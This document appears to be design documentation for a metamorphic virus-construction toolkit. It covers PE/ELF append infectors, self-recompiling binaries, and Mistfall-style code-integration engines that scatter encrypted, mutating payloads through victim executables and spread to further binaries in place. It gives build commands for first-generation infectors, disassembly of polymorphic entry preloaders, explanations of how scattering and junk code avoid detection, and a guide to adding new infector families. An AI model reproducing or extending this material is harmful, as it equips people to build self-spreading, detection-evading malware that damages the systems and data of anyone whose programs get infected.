# Metamorphic Bundle

Three families of higher-level programs are built on top of the compiler.
All are written in MystC (`#include` the backend), all live under
`bundles/`, and all are produced by the same machinery — the
**bundle** carrier flags on the backend (`--recompiler-{pe,elf}`,
`--infector-{pe,elf}`, `--integrator-{pe,elf}`).

```
bundles/
├── infectors/         PE / ELF append infectors
├── recompilers/       Self-recompiling PE / ELF programs
└── integrators/       Code-integration engines (MystiqueFall + LacriMystique)
```

## What is a bundle?

A **bundle** is the set of `.mcb` components (plus the active genome) that
the backend's standalone PE/ELF writer auto-embeds into a binary's
`.data` section. Each bundle carries an XOR-encrypted payload region
described by a plaintext `BundleHeader`; the embedded components let
the binary read its own bytecode at runtime — recompile itself, deliver
a payload, or integrate code into a victim.

All three application families use the same mechanism, but the layout
varies with the family's needs:

| Family | Layout | Components |
|---|---|---|
| **Recompiler** | `[recomp.mcb \| payload.mcb \| genome]` | 2–3 |
| **Infector** | `[infector.mcb \| payload.mcb \| genome]` | 2–3 |
| **Integrator** | `[entry.mcb \| engine.mcb \| payload.mcb \| genome]` | 3–4 |

`payload.mcb` is optional throughout — omit the positional argument
to the carrier flag and the writer produces a "gen0" bundle with no
embedded payload (the binary still runs; it just has nothing to
deliver).

**Payload lifecycle.** All three families treat `payload.mcb` the same
way at runtime: call `bundle_open()` (which XOR-decrypts the component
range in place), compile the payload to PIC, load the result into RWX
memory, and call its entry. Recompilers and infectors go through the
`compile_and_run_payload()` helper in `backend_mystc.mc`; integrators
inline the equivalent (`compile_one(...)` + `load_and_run_bin(...)`)
directly in `integrator_entry.mc`. This happens *before* genome
mutation and the family's own work (recompile / infect / integrate),
so a payload sees the same genome it was packed with and runs even if
a later stage fails. With `pay_sz == 0` the call is a no-op.

**Where's the backend?** Each carrier `.mcb` (`recomp.mcb`,
`infector.mcb`, `entry.mcb`) `#include`s `backend_mystc.mc` at
frontend-compile time, so it already contains the full ~6,500-line
backend — there is no separate "backend" component.

### The runtime handle

A bundle binary needs to find its own embedded data at runtime. The
handle is a single `BundleHeader` pointer in `stdlib.mc` and a plaintext
header structure laid out next to the encrypted components in `.data`:

```c
// stdlib.mc — set by the auto-embed writer to the absolute address
// of the BundleHeader. 0 if the binary wasn't built with a bundle.
struct BundleHeader* g_bundle_header;

struct BundleHeader {
    int   magic;            // 0x4154454D ("META")
    int   version;          // 1
    int   header_size;      // = 32 + n_descriptors * 16
    int   n_descriptors;
    char* base_addr;        // absolute address of the component bytes
    int   payload_size;     // bytes covered by `key` XOR
    int   key;              // XOR key (0 = plaintext / already decrypted)
    int   flags_reserved;
};

struct Descriptor {  // n_descriptors of these follow the header
    int kind;        // BC_CARRIER / BC_ENTRY / BC_ENGINE / BC_PAYLOAD / BC_GENOME
    int offset;      // bytes from base_addr to the component data
    int size;
    int flags;       // bit 0 = encrypted (forward-compat placeholder; today
                     // every component shares the top-level header.key XOR
                     // across the full payload_size range)
};
```

On-disk layout in `.data` (encrypted components first, header at the
bottom; `header.base_addr` points back up to the top of the XOR'd
region):

```
   ┌─────────────────────────────────────┐
   │ recomp / infector / entry  .mcb     │ ┐
   │   (+ embedded backend_mystc.mcb)    │ │
   ├─────────────────────────────────────┤ │
   │ mystiquefall / lacrimystique .mcb   │ │ XOR'd with
   │     (integrator only)               │ │ header.key over
   ├─────────────────────────────────────┤ │ payload_size
   │ payload.mcb   (optional)            │ │ bytes
   ├─────────────────────────────────────┤ │
   │ genome   (138 B)                    │ ┘
   ├─────────────────────────────────────┤
   │ BundleHeader (32 B)                 │ ┐
   │   "META" · version · header_size    │ │
   │   n_desc · base_addr                │ │ plaintext
   │   payload_size · key · flags        │ │
   ├─────────────────────────────────────┤ │
   │ Descriptor[n_desc]   (16 B each)    │ │
   │   kind · offset · size · flags      │ │
   └─────────────────────────────────────┘ ┘

   Descriptor kinds per family:
     Recompiler  : [ CARRIER · PAYLOAD? · GENOME ]
     Infector    : [ CARRIER · PAYLOAD? · GENOME ]
     Integrator  : [ ENTRY   · ENGINE   · PAYLOAD? · GENOME ]
```

See [architecture.md](architecture.md) for the system-context view —
how this `.data` region fits into the surrounding PE/ELF and where it
comes from in the build pipeline.

At *build* time the standalone PE/ELF writer (C and MC backends alike)
appends the header + descriptor table after the encrypted components,
then post-patches `g_bundle_header` and `header.base_addr` with their
absolute VAs once the section layout is known. At *runtime* the carrier
calls `bundle_open(g_bundle_header)` — which validates magic/version,
XOR-decrypts the payload range with `header.key`, and zeroes the key.
Components are then read via `bundle_get(h, BC_*, &sz)`, which returns
`base_addr + descriptor.offset`.

The umbrella term **bundle architecture** covers the whole arrangement —
auto-embed at build time, decrypt-and-read at runtime. The integrator's
4-component layout is the most elaborate case (it adds the entry/engine
split discussed below), but recompilers and infectors use the same
mechanism with fewer descriptors.

## Infectors

`bundles/infectors/infector_pe.mc`, `infector_elf.mc`. Source.

A traditional **append infector**: opens a target binary, expands an
existing section / segment to fit a transformed copy of the embedded
payload, and patches the entry point to jump into the appended code
first (which runs the payload, then jumps to the original entry).
Mechanism differs by format:

- **PE** (`infector_pe.mc`): appends shim + payload code to the
  existing `.text` section, and any payload data + import patch +
  bundle to the existing `.data` section. Both sections grow
  (`VirtualSize` and `SizeOfRawData` are bumped), and every section
  that came after them is shifted forward in VA — so the rest of the
  PE has its relocations updated to compensate. No new PE section is
  created.
- **ELF** (`infector_elf.mc`): uses the classic **PT_NOTE → PT_LOAD**
  trick — finds the existing `PT_NOTE` program header, rewrites it
  into a new `PT_LOAD` segment with `R+W+X` permissions, and appends
  the payload at the end of the file. This adds a new *segment* but
  does not touch any existing sections.

Build:

```bash
backend_mystc.exe my_payload.mcb \
    --infector-pe out.exe --bundles-dir bundles --seed 42
# or
backend_mystc.exe --infector-pe gen0.exe --bundles-dir bundles --seed 42
# (no positional payload = gen0 with empty payload)
```

The `--infector-pe` / `--infector-elf` bundle flag uses
`bundles/infectors/infector_{pe,elf}.mcb` as the carrier; the
positional `input.mcb` becomes the embedded payload that the infector
will append to its targets. Without a positional input, the infector is
built with no payload (it can still run; it just appends nothing
meaningful).

Pros: simple, fast, no host-binary modification required beyond the
appended region. Cons: that appended region is a single contiguous
block of foreign code — easy to spot, whether it appears as an oversize
`.text/.data` pair (PE) or as an extra `PT_LOAD` segment (ELF). The
integrators below address this.

## Recompilers

`bundles/recompilers/recomp_pe.mc`, `recomp_elf.mc`. Source.

A **self-recompiling backend**: when you run a recompiler binary, it
reads its own embedded `.mcb` (the entire backend, plus the genome),
mutates the genome by one step, recompiles itself with the mutated
genome, and writes the next generation to disk (`.\<name>_new.exe` on
Windows, `./a.out` on Linux).

Build:

```bash
backend_mystc.exe my_payload.mcb \
    --recompiler-pe out.exe --bundles-dir bundles --seed 1
# or
backend_mystc.exe --recompiler-pe gen0.exe --bundles-dir bundles --seed 1
# (gen0 with the recompiler itself as the only useful content)
```

The `--recompiler-pe` / `--recompiler-elf` bundle flag uses
`bundles/recompilers/recomp_{pe,elf}.mcb` as the carrier; the
positional `input.mcb` becomes the embedded payload, which the
recompiler runs (compiled to PIC, executed in RWX) before it
mutates the genome and recompiles itself.

## Integrators

The most sophisticated of the three: **code integration** rather than
section append. Instead of appending a contiguous block of payload to a
victim's `.text`, the integrator scatters payload functions (sliced on
RET boundaries) throughout the victim's existing code, glued together
with re-emitted branches.

This is the **Mistfall** code-integration model (Z0MBiE, 29A#6, 2002)
adapted for x86-32 PE and ELF; the ELF variant additionally borrows
from herm1t's Lacrimae, which is why the engines are named
**MystiqueFall** and **LacriMystique**. The result is that the entry's
instructions are interspersed with the victim's instructions throughout
`.text` — there is no contiguous "payload section" to point at.

The two integrator engines are:

- **MystiqueFall** (Win32 / PE):
  `bundles/integrators/mystiqueFall/mystiquefall.mc` (~3,000 lines).
- **LacriMystique** (Linux / ELF):
  `bundles/integrators/lacriMystique/lacrimystique.mc` (~4,000
  lines).

Both engines share three support files in `bundles/integrators/`:

- `integrator_entry.mc` — the entry program that gets scattered into the victim.
- `integrator_common.mc` — `CodeNode` linked-list, scatter logic.
- `lde.mc` — length disassembly engine for parsing existing host code.

### The integrator bundle

The integrator bundle is the most elaborate variant — see
[What is a bundle?](#what-is-a-bundle) above for the umbrella concept
shared with recompilers and infectors. Where those carry one or two
`.mcb` components (the binary's own bytecode plus an optional payload),
the integrator splits its bytecode in two:

```
.data: [entry.mcb] [engine.mcb] [payload.mcb] [genome] [BundleHeader+descriptors]
       └─────── components, XOR'd with header.key ────┘└─── plaintext ────┘
```

(`payload.mcb` is optional — see [What is a bundle?](#what-is-a-bundle).)
The plaintext header sits next to the encrypted components; `g_bundle_header`
points at it. At runtime the entry calls `bundle_open` (validates magic +
version, XOR-decrypts the component range via `header.key`), mutates the
genome, recompiles both stages, assembles a fresh bundle for the next
generation, and hands control to the engine.

The two stages:

- **Entry** — the piece that gets scattered through the victim's `.text`
  (~300–540 KB compiled, depending on which transforms are enabled).
  Includes the full backend, because all `compile_one` calls live in
  the entry — at runtime it has to compile both `entry.mcb` and
  `engine.mcb` for the next generation.
- **Engine** — runs from freshly allocated RWX memory, compiled on the
  fly by the entry. Holds the integration logic (disassembly + scatter + reassembly) but **does not** include the backend; it consumes
  pre-compiled bytes the entry hands it through the `InfectBundle`
  struct. Never statically present in the host binary.

Why the split? Putting both stages in the scattered `.text` would mean
shipping the backend twice (once in the entry's compiles, once in the
engine's). Dropping the backend from the engine cuts its `.mcb` to
roughly 50–70% of the entry's size (52% on PE, 67% on ELF). The entry
stays focused on compile flow; the engine on integration flow.

Runtime sequence on an infected binary:

1. Victim's entry runs — scattered code + a tiny entry stub.
2. Entry calls `bundle_open(g_bundle_header)` — magic + version check,
   then XOR-decrypts the encrypted component range (`header.base_addr`
   for `header.payload_size` bytes) with `header.key`. `bundle_get(h,
   BC_*, &sz)` then yields each component pointer + size.
3. Entry **runs the payload** in fresh RWX memory.
4. Entry **mutates the genome** by one step.
5. Entry **compiles `entry.mcb`** in scatter mode — `CF_ABS_PE |
   CF_EMIT_MC` on PE, `CF_SCATTER_ELF | CF_CDECL_EXTERNS | CF_EMIT_MC`
   on ELF — producing scatter-ready bytes (for the next victim's
   `.text`) and a transformed `.mcb` (for embedding into the next
   bundle).
6. Entry **compiles `engine.mcb`** in PIC mode (the default — neither
   `CF_ABS_PE` nor `CF_SCATTER_ELF` set), producing PIC shellcode for
   RWX execution and a transformed `.mcb` for the next bundle.
7. Entry **populates an `InfectBundle`** (defined in
   `integrator_common.mc`) with its compile products and a pointer to
   its own `BundleHeader`, then **loads the engine into RWX** via
   `load_and_run_bin`, which patches the engine's `g_infect_bundle`
   slot with the struct's address and calls the engine's entry.
8. The **engine** reads the next victim binary, calls the integrator's
   `scatter` function on the entry's compiled bytes, builds a fresh
   bundle `[entry' | engine' | payload | genome']`, and writes the
   infected binary out.

### CodeNode scatter (Mistfall)

`bundles/integrators/integrator_common.mc` defines (essential fields shown — there are also per-node fixup arrays for data / IAT / CALL / FUNC_ADDR fixups):

```c
struct CodeNode {
    int     flags;           // FL_SEEN / FL_ME / FL_BRANCH / FL_STOP / ...
    int     len;             // instruction byte count
    char*   src;             // instruction bytes
    int     oldrva;          // original VA in the victim
    int     newrva;          // post-scatter VA
    int     newofs;          // post-scatter offset in the output buffer
    int     target_rva;      // for FL_BRANCH: branch target VA (-1 if none)
    struct CodeNode* link;   // resolved branch target node
    struct CodeNode* next;
    struct CodeNode* prev;
    // ...fixup arrays follow
};
```

The flag bits used to drive scatter and fixup are all `FL_*`:
`FL_SEEN` (reachable from entry), `FL_ME` (payload — "this is mine"),
`FL_FREESRC` (src buffer was malloc'd), `FL_IMPORT`, `FL_ALIGN`,
`FL_ABSREF`, `FL_CODEREF`, `FL_PICBASE`, `FL_PICDATA`, `FL_BRANCH`,
`FL_STOP`. LacriMystique adds three ELF-specific flags
(`FL_GOTOFF`, `FL_GOTPTR`, `FL_EXTERN`).

The integrator engine:

1. Disassembles the victim's `.text` into a CodeNode linked list (one
   instruction per node), using `lde.mc`'s length disassembly engine.
2. Disassembles the entry program's compiled bytes into a parallel chain
   with all nodes tagged `FL_ME` ("this is mine").
3. Shuffles the entry chain's functions (RET-delimited slices) via
   Fisher-Yates.
4. Interleaves the shuffled function chunks into the victim chain at
   victim RET boundaries (PRNG-jittered).
5. Reassembles the merged chain into a new `.text`, recomputing every
   relative branch displacement and absolute relocation as nodes move.


### MystiqueFall (PE)

Win32-specific. Handles:

- PE header parsing & rewriting.
- Import table relocation when the entry needs new imports.
- Reloc table updates for absolute references that move.
- Skip-relocs buffer (size 256) for handling cross-boundary relocs that
  fall on inserted entry blocks.

Build a gen0 PE infector via the `--integrator-pe` bundle flag:

```bash
backend_mystc.exe my_payload.mcb \
    --integrator-pe gen0.exe --bundles-dir bundles --seed 42
```

The carrier (`integrator_entry_pe.mcb`) and engine (`mystiquefall.mcb`)
are auto-resolved from `--bundles-dir`; the positional `my_payload.mcb`
becomes the embedded payload. Omit the positional to produce a
no-payload gen0.

Tested by `pytest -m mystiquefall` (4 tests, ~15 min wall clock).

### LacriMystique (ELF)

Linux equivalent. Handles:

- ELF32 header + program header parsing & rewriting.
- Section-header table copy-and-patch (preserves the victim's section
  layout so tools that walk section headers still see a valid ELF).
- Dynamic relocation handling for PIE/dynamic victims.
- Writes the infected output back to `victim_path` (in-place infection).

Build a gen0 ELF infector via `--integrator-elf`:

```bash
backend_mystc.exe my_payload.mcb \
    --integrator-elf gen0 --bundles-dir bundles --seed 42
```

Same shape as the PE form — carrier and engine auto-resolved, positional
is the embedded payload.

Tested by `pytest -m lacrimystique` (13 tests).

## Polymorphic entry preloader

Both **infectors** and **integrators** write a tiny entry preloader at
the end of their inserted code at infection / integration time. It's
the piece the OS jumps to when the victim launches; everything else
(the appended payload, the scattered chain) is reached *through* the
preloader.

The structural skeleton is the same in all four programs:

```
[junk] save_regs [junk] entry_call [junk] (payload_call [junk]) restore_regs [junk] oep_xfer
```

`save_regs` / `restore_regs` replace the old `PUSHAD` / `POPAD` with a
PRNG-picked 3-7 register subset pushed/popped LIFO; `entry_call` and
`oep_xfer` each pick a byte-shape variant (`CALL rel32` /
`MOV r,imm; CALL r` for the call, `JMP rel32` / `PUSH imm; RET` /
`MOV r,imm; JMP r` for the transfer). MystiqueFall also adds a
`payload_call` slot for an optional payload-entry CALL between
`entry_call` and `restore_regs`.

Linux infector adds `PUSH api_table_va` before `entry_call` and
`ADD ESP, 4` after, to pass the API table to the cdecl entry. The
LacriMystique preloader is more elaborate: a single PIC trio (`CALL
$+0; POP EBX; [strict junk]; ADD EBX, imm32`) caches `EBX` on the
stack across the entry CALL, after which `MOV EAX, [EBX+disp32]` reads
the host's `main` from the GOT and a PRNG-shuffled argc/argv handoff
hands control off.

The `[junk]` slots are PRNG-emitted by `poly_junk` (in
`bundles/preloader_common.mc`), which has three modes selected by
the `scratch_reg` argument:

- **strict** (`-2`): only flags-only or live-restored forms (`TEST r,r`,
  `CMP r1,r2`, `LEA r,[r+k] ; LEA r,[r-k]`). Safe everywhere — used
  inside PIC base sequences and syscall arg setup.
- **auto-pick** (`-1`): non-clobbering forms that pick their own
  non-ESP register (`MOV r1,r2` / `TEST` / `CMP` / `XCHG` / `LEA-pair`).
  Safe outside any save/restore bracket.
- **pinned** (`>= 0`): clobbering imm-arith targeting the named scratch
  register (`MOV` / `ADD` / `SUB` / `XOR` / `AND` / `SHL` / `SHR` —
  with an imm32 or imm8). Caller must guarantee the reg is safe to
  clobber.

Count distribution per call is uniform `[0, 6]` (strict / auto) or
`[0, 8]` (pinned), so a slot can also emit nothing at all.

### Worked example: an integrated PE preloader

Disassembly of an actual preloader emitted by MystiqueFall after
integrating `stress_victim.exe`
(`test_artifacts/mfall/test_infect_and_run0/victim.exe`, AddressOfEntryPoint
patched to point here). Skeleton positions annotated on the right:

```
0x0048dc37: 81ef8ed9e52a   sub  edi, 0x2ae5d98e   ┐
0x0048dc3d: c1e704         shl  edi, 4            │
0x0048dc40: 81ef995d7c4b   sub  edi, 0x4b7c5d99   │
0x0048dc46: 81f733ef8406   xor  edi, 0x0684ef33   ├ [junk] (pinned EDI, 8 ops)
0x0048dc4c: 81efdd653043   sub  edi, 0x433065dd   │
0x0048dc52: 81e717d4362a   and  edi, 0x2a36d417   │
0x0048dc58: 81ef6170c24f   sub  edi, 0x4fc27061   │
0x0048dc5e: 81f73b35471b   xor  edi, 0x1b47353b   ┘

0x0048dc64: 56             push esi               ┐
0x0048dc65: 51             push ecx               │
0x0048dc66: 52             push edx               │
0x0048dc67: 50             push eax               ├ save_regs (PRNG-picked order)
0x0048dc68: 55             push ebp               │
0x0048dc69: 53             push ebx               │
0x0048dc6a: 57             push edi               ┘

0x0048dc6b: 81eb27ea6037   sub  ebx, 0x3760ea27   ┐
0x0048dc71: c1e303         shl  ebx, 3            ├ [junk] (pinned EBX, 3 ops)
0x0048dc74: 81c32eadd77c   add  ebx, 0x7cd7ad2e   ┘

0x0048dc7a: e8483cf8ff     call 0x004118c7        — entry_call (CALL rel32)

0x0048dc7f: 81e2b93ee311   and  edx, 0x11e33eb9   ┐ [junk] (pinned EDX, 2 ops)
0x0048dc85: c1ea04         shr  edx, 4            ┘

0x0048dc88: 5f             pop  edi               ┐
0x0048dc89: 5b             pop  ebx               │
0x0048dc8a: 5d             pop  ebp               │
0x0048dc8b: 58             pop  eax               ├ restore_regs (reverse of save)
0x0048dc8c: 5a             pop  edx               │
0x0048dc8d: 59             pop  ecx               │
0x0048dc8e: 5e             pop  esi               ┘

0x0048dc8f: c1e203         shl  edx, 3            ┐
0x0048dc92: 81f25b177d46   xor  edx, 0x467d175b   ├ [junk] (pinned EDX, 4 ops)
0x0048dc98: c1e203         shl  edx, 3            │
0x0048dc9b: 81f212b9fb32   xor  edx, 0x32fbb912   ┘

0x0048dca1: e9109ef7ff     jmp  0x00407ab6        — oep_xfer  (JMP rel32 to OEP)
```

Notes:

- Four `[junk]` slots fired (8 + 3 + 2 + 4 = 17 imm-arith ops) — all in
  *pinned* mode, valid because the EDI/EBX/EDX registers they target are
  inside the `save_regs` / `restore_regs` bracket and free to clobber.
- `entry_call` resolved to a `CALL rel32` (5 bytes); the variant table
  also includes `MOV r,imm32; CALL r` (7 bytes). Per-run PRNG decides.
- `oep_xfer` resolved to `JMP rel32`; the alternatives are
  `PUSH imm32; RET` and `MOV r,imm32; JMP r`.
- The `payload_call` slot (MystiqueFall-only) is absent here — this
  particular integrated victim carried no payload, so there was nothing
  to call.

### Worked example: an infected Linux preloader (LacriMystique)

Disassembly of a LacriMystique preloader, produced by infecting
`victim_math.elf32` with a freshly built engine. Note this preloader
is structurally different from MystiqueFall's — it replaces `_start`
wholesale (GOT resolution + libc-less exit), so it folds the System V
startup scaffolding into the polymorphic skeleton:

```
0x00066e98: 81e875969041   sub  eax, 0x41909675   ┐
0x00066e9e: b86f886d72     mov  eax, 0x726d886f   │ [junk] pinned EAX
0x00066ea3: 81f0791eef7f   xor  eax, 0x7fef1e79   │
0x00066ea9: c1e003         shl  eax, 3            ┘
0x00066eac: 52             push edx                — save EDX
0x00066ead: e800000000     call 0x00066eb2        ┐
0x00066eb2: 5b             pop  ebx               │ PIC trio: CALL $+0
0x00066eb3: 85d2           test edx, edx          │ + POP EBX + [junk strict]
0x00066eb5: 81c342610000   add  ebx, 0x00006142   ┘ + ADD EBX, imm32
                                                    EBX = entry_va + 0x6142
0x00066ebb: 53             push ebx                — cache GOT base
0x00066ebc: 81e9be77f81e   sub  ecx, 0x1ef877be   ┐
0x00066ec2: b9a07def47     mov  ecx, 0x47ef7da0   │
0x00066ec7: 81f1d2978f30   xor  ecx, 0x308f97d2   │ [junk] pinned ECX
0x00066ecd: 81f1d4da9a04   xor  ecx, 0x049adad4   │
0x00066ed3: c1e901         shr  ecx, 1            │
0x00066ed6: 81e10704d94e   and  ecx, 0x4ed90407   ┘
0x00066edc: e84906fcff     call 0x0002752a        — entry_call (engine entry)
0x00066ee1: 5b             pop  ebx               ┐ restore EBX (GOT base)
0x00066ee2: 5a             pop  edx               ┘ restore EDX
0x00066ee3: 81c62becd54c   add  esi, 0x4cd5ec2b   ┐
0x00066ee9: 81f69585d067   xor  esi, 0x67d08595   │
0x00066eef: c1e602         shl  esi, 2            │ [junk] pinned ESI
0x00066ef2: 81e624946b3e   and  esi, 0x3e6b9424   │
0x00066ef8: bef6e47149     mov  esi, 0x4971e4f6   │
0x00066efd: 81ee98b79861   sub  esi, 0x6198b798   │
0x00066f03: c1ee02         shr  esi, 2            ┘
0x00066f06: 8b83f8ffffff   mov  eax, [ebx - 8]    — MOV EAX, [EBX+disp32]:
                                                    read host's main from GOT
0x00066f0c: 85f6           test esi, esi          ┐
0x00066f0e: 39ca           cmp  edx, ecx          │ [junk strict] before CALL:
0x00066f10: 8d5b7d         lea  ebx, [ebx + 0x7d] │ flags-only + LEA-pair
0x00066f13: 8d5b83         lea  ebx, [ebx - 0x7d] │ (no clobber of EBX/EAX)
0x00066f16: 8d5b63         lea  ebx, [ebx + 0x63] │
0x00066f19: 8d5b9d         lea  ebx, [ebx - 0x63] ┘
0x00066f1c: 5f             pop  edi               ┐
0x00066f1d: 89e1           mov  ecx, esp          │ System V _start tail:
0x00066f1f: 83e4f0         and  esp, 0xfffffff0   │ align stack, push argc/argv,
0x00066f22: 51             push ecx               │ CALL EAX (= main)
0x00066f23: 57             push edi               │
0x00066f24: ffd0           call eax               ┘
0x00066f26: 93             xchg ebx, eax          ┐
0x00066f27: 31c0           xor  eax, eax          │ exit(main_rv) via syscall #1
0x00066f29: 81c001000000   add  eax, 1            │
0x00066f2f: cd80           int  0x80              ┘
```

Notes:

- The PIC trio (`CALL $+0; POP EBX; [junk strict]; ADD EBX, imm32`) is
  what makes this PIE-safe: EBX captures the runtime VA, and the
  imm32 carries a PRNG-disguised displacement to the GOT base.
- `[junk strict]` mode (`TEST`, `CMP`, self-cancelling `LEA-pair`s) is
  used inside the PIC trio and in the pre-`CALL main` window where
  EBX/EAX must remain live. The `LEA ebx,[ebx±k]` pairs are net-zero —
  they perturb the byte shape without changing EBX.
- Unlike the PE preloader, there's no `save_regs`/`restore_regs` block —
  lacri inlines `PUSH EDX/EBX` … `POP EBX/EDX` around the entry CALL,
  and reuses System V `_start` scaffolding
  (`pop edi; and esp,~15; …; int 0x80`) for argv handoff and exit.

Recompilers don't have a preloader — they're plain standalone PE/ELFs
whose OS entry point is `main` directly.

| Program | Source | Junk emitter |
|---|---|---|
| Infector PE | `infector_pe.mc` ("Write polymorphic entry preloader" block) | `poly_junk` |
| Infector ELF | `infector_elf.mc` ("Write polymorphic entry preloader" block) | `poly_junk` |
| MystiqueFall (PE) | `mystiquefall.mc` (`write_abs_entry_preloader`) | `poly_junk` |
| LacriMystique (ELF) | `lacrimystique.mc` (inline `bridge_preloader` assembly) | `poly_junk` |

## Disassembling integrator output

`utils/integrator_disasm.py` produces a color-coded HTML diff between an
original binary and its infected version. It auto-detects PE vs ELF and
labels the output accordingly:

```bash
python utils/integrator_disasm.py orig.exe infected.exe
# → integrator_disasm.html (~4 MB for a small PE, ~10 MB for an ELF)
```

The HTML highlights host code (blue), payload code (red), and the entry
preloader (yellow), with a clickable minimap for navigation. Useful for
visualizing exactly where the scatter put the entry's instructions.

## Adding a new bundle family

Recompilers, infectors, and integrators all share the same scaffolding —
the only things that vary are (a) what the carrier does at runtime and
(b) whether it ships an engine. Adding a fourth family means plugging
into five places. Concrete reference: read one existing family's files
side-by-side as you work (infectors are the shortest).

### 1. Descriptor kind — `compiler/backend/stdlib.mc` (`BC_*` constants)

Only if the family ships a component shape the existing five kinds don't
cover. The kinds are `BC_CARRIER`, `BC_ENTRY`, `BC_ENGINE`, `BC_PAYLOAD`,
`BC_GENOME`. Most new families reuse `BC_CARRIER` + `BC_PAYLOAD` +
`BC_GENOME` (single-carrier shape) or `BC_ENTRY` + `BC_ENGINE` +
`BC_PAYLOAD` + `BC_GENOME` (entry-engine shape). Add a new `BC_*` enum
only for a genuinely new component class.

### 2. Backend CLI flag — both backends

Touch points in **`compiler/backend/backend_mystc.c`** (the standalone
CLI lives only in the C backend; `backend_main.mc` is a thin wrapper
with no argv parsing, so no MC-side edits are needed here):

- Declare `out_<family>_pe` / `out_<family>_elf` argv slots alongside
  the other `out_*_{pe,elf}` declarations.
- Parse `--<family>-pe` / `--<family>-elf` in the argv parse loop, and
  bump the `bundle_count` gate that enforces one-bundle-flag-per-run.
- Resolve the carrier path in the bundle-flag dispatch block (the
  `if/else if` chain over `out_recompiler_pe` / `out_infector_pe` /
  `out_integrator_pe` / …) and assign `out_pe_standalone` /
  `out_elf_standalone` so the existing PE/ELF writer is reused. Point
  `input_file` at the carrier `.mcb`. For entry+engine families also
  set `out_engine_mcb`.
- Add to the usage string and `--help`.

The writer auto-embeds the bundle (carrier + payload + genome + optional
engine) into `.data`, lays down the `BundleHeader` + `Descriptor` table,
and XOR-encrypts the component range with `header.key`. No new writer
code is needed if the layout matches an existing shape.

### 3. Carrier source — `bundles/<family>/<family>_{pe,elf}.mc`

All three current families are **compile-capable** — they all
`#include "../../compiler/backend/backend_mystc.mc"` because every
generation calls `mutate_genome()` + `compile_one()` to produce a
polymorphically distinct Gen N+1. A purely static one-shot family (no
self-recompilation, ships a pre-built gen0 and never regenerates) could
get away with `#include "../../compiler/backend/stdlib.mc"` only —
smaller `.mcb`, but loses the metamorphic property. Nothing in the tree
uses this shape today; default to compile-capable unless you have a
specific reason.

`#include "../preloader_common.mc"` regardless — it provides the
polymorphic entry preloader (save/restore regs, junk fill, control
transfer). Share platform-symmetric logic via a `<family>_common.mc`
next to the carrier sources (see `infector_common.mc`,
`recomp_common.mc`, `integrator_common.mc`).

`main()` template:

```c
int main() {
    char* payload; int pay_sz;
    char* genome;  int gen_sz;
    if (bundle_open(g_bundle_header) == 0) return 1;   // bad magic/version
    payload = bundle_get(g_bundle_header, BC_PAYLOAD, &pay_sz);
    genome  = bundle_get(g_bundle_header, BC_GENOME,  &gen_sz);
    // ... family-specific behavior ...
    return 0;
}
```

Entry+engine families additionally compile the engine to PIC and JIT it
via `load_and_run_bin(bin, bin_sz, &bundle, g_bundle_header)`. The
engine reads its inputs via the `InfectBundle*` patched into its
`g_infect_bundle` slot at load time.

### 4. Build hook — `build.py`

In `build_mcbs()`, add:

```python
frontend_compile(NEW_FAMILY_PE_MC,  NEW_FAMILY_PE_MCB,  defines=["WIN32"], strip_debug=strip_debug, scramble_globals=scramble_globals)
frontend_compile(NEW_FAMILY_ELF_MC, NEW_FAMILY_ELF_MCB, defines=["LINUX"], strip_debug=strip_debug, scramble_globals=scramble_globals)
```

Define the matching path constants alongside the existing per-family
constants at the top of the file. Don't skip `strip_debug=strip_debug`
— that's what plumbs `--strip-debug` through. Same goes for
`scramble_globals=scramble_globals` and `--scramble-globals`.

### 5. Tests — `tests/e2e/test_<family>.py`

Mirror the shape of the closest existing family:

- Section-append style → `test_infector_pe.py` / `test_infector_elf.py`.
- Self-rebuild style → `test_standalone_recompilation.py`.
- Entry+engine integration → `test_mystiquefall.py` /
  `test_lacrimystique.py`.

Build Gen0 via `subprocess.run([BACKEND_EXE, payload_mcb,
"--<family>-pe", out_exe, "--bundles-dir", BUNDLES_DIR, "--seed", "..."])`,
then run the output and assert family-specific invariants. Use
`tmp_path` for all artifacts. If you want a marker, add it to
`pytest.ini` alongside `mystiquefall` / `lacrimystique`.

### 6. Docs

- Add a section to **this file** between the existing family sections,
  matching the depth of "Infectors" / "Recompilers" / "Integrators".
- Update the per-family layouts block in `docs/architecture.md` to
  include the new shape.
- Bump test counts in `docs/testing.md` and `docs/README.md` after the
  new tests land.

### Invariants and pitfalls

- **Layout order matters.** Writer emits `[carrier[+engine][+payload]+
  genome | pad | BundleHeader | Descriptor[n]]` in `.data`. Descriptor
  offsets are measured from `header.base_addr`, which points at the
  first component (so descriptor offsets are positive). Don't reorder
  components between writer and consumer.
- **`bundle_open` is idempotent.** It zeroes `header.key` after the
  first successful decrypt — safe to call again, no-op the second time.
- **One bundle flag per invocation.** The dispatch block enforces
  this; multiple flags on one command line is an error, not a merge.
- **`--strip-debug` silently drops `print()` calls.** Functionality is
  preserved but stdout markers vanish. Don't gate runtime behavior on a
  `print` side effect, and don't assert on stripped stdout in tests
  that should pass under both build flavors.
- **Entry+engine families: the entry is what gets scattered.** Only
  `entry.mcb` is integrated into the victim's `.text`; the engine runs
  from RWX memory, compiled on the fly. Keep the entry small.
- **The carrier's `main()` is the binary's entry point.** It must
  return 0 on the success path; non-zero surfaces as the process exit
  code on both platforms.

### Verification checklist

```bash
python build.py build                                    # baseline
python build.py build --strip-debug                      # strip-debug variant
python build.py build --scramble-globals                 # scramble-globals variant
pytest tests/e2e/test_<family>.py -v                     # new family tests
pytest -m <family>                                       # if you added a marker
pytest                                                   # full suite, no regressions
```
